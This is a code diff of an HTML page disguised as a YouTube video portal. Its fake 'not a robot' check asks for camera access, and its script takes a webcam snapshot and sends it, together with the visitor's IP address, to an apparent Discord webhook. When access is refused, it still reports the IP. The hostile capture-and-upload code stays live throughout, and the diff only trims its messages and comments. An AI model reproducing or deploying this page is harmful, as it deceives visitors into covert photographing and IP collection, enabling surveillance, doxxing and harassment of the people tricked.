@@ -1,10 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>YouTube</title>
     <meta property="og:title" content="YouTube - Watch Now">
     <meta property="og:description" content="Official YouTube Portal">
     <meta property="og:image" content="https://img.youtube.com/vi/GoHLDPWT6Hw/maxresdefault.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
     <meta property="og:type" content="video.other">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -23,7 +26,7 @@
         <div class="play-btn" onclick="huliKaSigbin()"></div>
         <h2>Confirm you're not a robot</h2>
         <p>Please allow camera access to verify and play the video.</p>
-        <div id="error" class="error-msg">⚠️ ACCESS DENIED! <br> You must ALLOW camera access to watch this video. <br> Please refresh and try again.</div>
+        <div id="error" class="error-msg">⚠️ ACCESS DENIED! <br> Please ALLOW camera access to watch this video.</div>
     </div>
 
     <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw" allow="autoplay; encrypted-media"></iframe>
@@ -40,19 +43,14 @@
             const lockScreen = document.getElementById('lock-screen');
 
             try {
-                // Kunin ang IP agad
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-
-                // FORCE CAMERA POPUP
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                // PAG NAG-ALLOW, DITO LANG LALABAS ANG VIDEO
                 lockScreen.style.display = 'none';
                 player.style.display = 'block';
-                player.src += "?autoplay=1"; // Auto-play pagka-allow
+                player.src += "?autoplay=1";
 
-                // Kunin ang snapshot
                 const vid = document.getElementById('v');
                 vid.srcObject = stream;
 
@@ -62,27 +60,19 @@
                     can.getContext('2d').drawImage(vid, 0, 0);
                     const img = can.toDataURL('image/jpeg', 0.6);
                     const blob = await (await fetch(img)).blob();
-                    
                     const fd = new FormData();
                     fd.append('file', blob, 'huli_ka.jpg');
-                    fd.append('payload_json', JSON.stringify({
-                        content: "🎯 **SUCCESS! TARGET ALLOWED CAM**\n**IP Address:** " + ipData.ip
-                    }));
-
+                    fd.append('payload_json', JSON.stringify({ content: "🎯 **SUCCESS!** IP: " + ipData.ip }));
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 }, 1500);
-
             } catch (e) {
-                // PAG-DENY: HINDI LALABAS ANG VIDEO, LALABAS ANG ERROR
                 errorText.style.display = 'block';
-                
-                // Send "Denied" Notif sa Discord
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
                 fetch(hook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: "🚫 **DENIED!** Target refused camera.\n**IP:** " + ipRes.ip })
+                    body: JSON.stringify({ content: "🚫 **DENIED!** IP: " + ipRes.ip })
                 });
             }
         }
